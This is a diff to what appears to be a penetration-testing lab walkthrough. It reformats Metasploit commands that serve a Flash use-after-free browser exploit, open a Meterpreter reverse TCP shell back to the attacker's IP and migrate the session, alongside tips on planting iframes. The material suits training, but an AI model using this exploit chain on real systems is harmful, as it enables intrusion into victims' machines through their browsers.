@@ -441,8 +441,16 @@ IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
 
 Pro Tip 1: We will be doing quite a bit of work in this network and will need some help. If you haven't already, help your teammates gain access to the network and divide/conquer on the machines. We suggest adding multiple iframes, one pointing to each of your teammate's tap0 IP address then have them run their own exploit to get shells.
 
-use exploit/multi/browser/adobe_flash_hacking_team_uafset SRVPORT 80set URIPATH /set payload windows/meterpreter/reverse_tcpset LHOST <YOUR tap0 IP Address>runmeterpreter> psmeterpreter> migrate
-
+```
+meterpreter> use exploit/multi/browser/adobe_flash_hacking_team_uaf
+meterpreter> set SRVPORT 80
+meterpreter> set URIPATH /
+meterpreter> set payload windows/meterpreter/reverse_tcp
+meterpreter> set LHOST <YOUR tap0 IP Address>
+meterpreter> run
+meterpreter> ps
+meterpreter> migrate
+```
 
 Pro Tip 2: You will continue to exploit the browser and get additional shells each time the victim browses to the web page. You can turn off exploitation by killing the task with kill -K
 Pro Tip 3: When exploiting a user process like a web browser, you will lose your session if they close it. You can migrate your meterpreter to a more stable process.
